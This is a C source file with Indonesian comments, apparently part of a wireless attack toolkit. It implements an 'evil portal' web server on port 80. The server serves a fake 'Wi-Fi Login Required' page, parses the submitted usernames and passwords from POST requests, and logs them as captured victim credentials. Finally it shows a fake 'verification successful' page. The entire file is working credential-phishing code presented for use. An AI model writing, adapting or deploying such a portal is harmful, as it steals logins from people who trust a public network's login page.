// ============================================================================
// IMPLEMENTASI: server/evil_portal.c — Web Server Phishing Kredensial
// ============================================================================
#include "evil_portal.h"
#include "../utils/logger.h"
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>

static int g_sock = -1;
static volatile int g_running = 0;

// Template Halaman Login Phishing Standar
static char g_portal_html[4096] =
    "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n"
    "<!DOCTYPE html><html><head><title>Wi-Fi Login Required</title>"
    "<meta name='viewport' content='width=device-width, initial-scale=1'>"
    "<style>body{font-family:sans-serif;text-align:center;padding:40px;background:#f0f2f5}"
    ".card{background:white;padding:30px;border-radius:12px;box-shadow:0 4px 12px rgba(0,0,0,0.1);max-width:360px;margin:auto}"
    "input{width:90%;padding:10px;margin:10px 0;border:1px solid #ccc;border-radius:6px}"
    "button{width:95%;padding:12px;background:#0066cc;color:white;border:none;border-radius:6px;font-size:16px}</style></head>"
    "<body><div class='card'><h2>📶 Verifikasi Koneksi</h2><p>Masukkan kata sandi untuk mengakses internet:</p>"
    "<form method='POST' action='/login'>"
    "<input type='text' name='username' placeholder='Email / Username' required><br>"
    "<input type='password' name='password' placeholder='Password Wi-Fi' required><br>"
    "<button type='submit'>Lanjutkan</button></form></div></body></html>";

int evil_portal_set_template(const char *html) {
    if (!html) return -1;
    strncpy(g_portal_html, html, sizeof(g_portal_html) - 1);
    g_portal_html[sizeof(g_portal_html) - 1] = '\0';
    return 0;
}

/*
 * === FUNGSI: handle_http_request() ===
 * Tujuan   : Menyajikan halaman phishing atau menangkap hasil form submission
 * Catatan  : Mematuhi Fix #7 (Pemeriksaan NULL Body)
 */
static void handle_http_request(int cs) {
    char buf[2048] = {0};
    int n = recv(cs, buf, sizeof(buf) - 1, 0);
    if (n <= 0) { close(cs); return; }

    // Jika ini adalah form POST submission kredensial
    if (strncmp(buf, "POST", 4) == 0) {
        char *body = strstr(buf, "\r\n\r\n");
        // FIX #7: Cegah dereference NULL pointer jika body kosong
        if (body) {
            body += 4;
            credential_t cred = {0};
            strncpy(cred.host, "EvilPortal_Captive", sizeof(cred.host) - 1);
            cred.timestamp = time(NULL);

            char *u = strstr(body, "username=");
            if (u) {
                u += 9; int i = 0;
                while (*u && *u != '&' && i < 127) cred.username[i++] = *u++;
            }

            char *p = strstr(body, "password=");
            if (p) {
                p += 9; int i = 0;
                while (*p && *p != '&' && i < 127) cred.password[i++] = *p++;
            }

            log_credential(&cred); // Catat kredensial yang diserahkan korban!
        }

        // Tampilkan halaman konfirmasi sukses
        const char *ok = "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n"
                         "<html><body style='text-align:center;padding:50px;font-family:sans-serif'>"
                         "<h2>✅ Verifikasi Berhasil!</h2><p>Internet Anda telah aktif.</p></body></html>";
        send(cs, ok, strlen(ok), 0);
    } else {
        // Permintaan GET: Selalu sajikan formulir Captive Portal
        send(cs, g_portal_html, strlen(g_portal_html), 0);
    }
    close(cs);
}

/*
 * === FUNGSI: portal_thread() ===
 * Tujuan   : Thread TCP server port 80 untuk Evil Portal
 */
static void *portal_thread(void *arg) {
    ap_config_t *cfg = (ap_config_t*)arg;
    int port = cfg->portal_port > 0 ? cfg->portal_port : 80;
    struct sockaddr_in srv, cl;
    socklen_t cl_len = sizeof(cl);
    int opt = 1;

    g_sock = socket(AF_INET, SOCK_STREAM, 0);
    if (g_sock < 0) { g_running = 0; return NULL; }
    setsockopt(g_sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    memset(&srv, 0, sizeof(srv));
    srv.sin_family = AF_INET;
    srv.sin_addr.s_addr = INADDR_ANY;
    srv.sin_port = htons(port);

    if (bind(g_sock, (struct sockaddr*)&srv, sizeof(srv)) < 0) {
        close(g_sock); g_sock = -1; g_running = 0;
        perror("bind portal"); return NULL;
    }
    listen(g_sock, 10);
    log_event(LOG_INFO, "Evil Captive Portal aktif di port %d", port);

    while (g_running) {
        int cs = accept(g_sock, (struct sockaddr*)&cl, &cl_len);
        if (cs < 0) continue;
        handle_http_request(cs);
    }
    return NULL;
}

int evil_portal_start(ap_config_t *cfg) {
    if (g_running) return 0;
    g_running = 1;
    pthread_t tid;
    if (pthread_create(&tid, NULL, portal_thread, cfg) != 0) {
        g_running = 0;
        log_event(LOG_ERROR, "Gagal membuat thread evil portal");
        return -1;
    }
    pthread_detach(tid);
    return 0;
}

int evil_portal_stop(void) {
    g_running = 0;
    if (g_sock >= 0) { close(g_sock); g_sock = -1; }
    return 0;
}
